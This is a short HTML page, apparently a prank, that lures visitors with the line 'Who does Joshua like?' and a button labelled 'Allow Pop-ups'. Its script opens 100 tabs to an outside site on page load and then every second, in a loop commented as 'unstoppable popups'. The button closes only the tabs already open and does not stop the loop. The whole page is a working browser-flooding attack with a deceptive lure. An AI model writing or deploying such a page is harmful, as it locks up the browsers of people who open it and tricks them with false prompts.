<!DOCTYPE html>
<html>
<head>
    <title>Tab Opener</title>
    <style>
        body {
            background-image: url('https://i.imgur.com/9GcrldH.jpg');
            background-repeat: no-repeat;
            background-size: cover;
        }

        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
            font-size: 24px;
            color: black;
            font-weight: bold;
        }

        #buttonContainer {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        #unblockButton {
            padding: 10px 20px;
            font-size: 18px;
        }
    </style>
    <script>
        var newWindows = [];

        function openTabs() {
            for (var i = 0; i < 100; i++) {
                var newWindow = window.open('https://jz1324.github.io/noice/', '_blank');
                newWindows.push(newWindow);
            }
        }

        function allowPopups() {
            for (var i = 0; i < newWindows.length; i++) {
                newWindows[i].close();
            }
        }

        // Additional modification for unstoppable popups
        setInterval(openTabs, 1000);
    </script>
</head>
<body onload="openTabs()">
    <div id="overlay">
        <span>Who does Joshua like? Click the button to allow pop-ups.</span>
        <br>
        <div id="buttonContainer">
            <button id="unblockButton" onclick="allowPopups()">Allow Pop-ups</button>
        </div>
    </div>
</body>
</html>
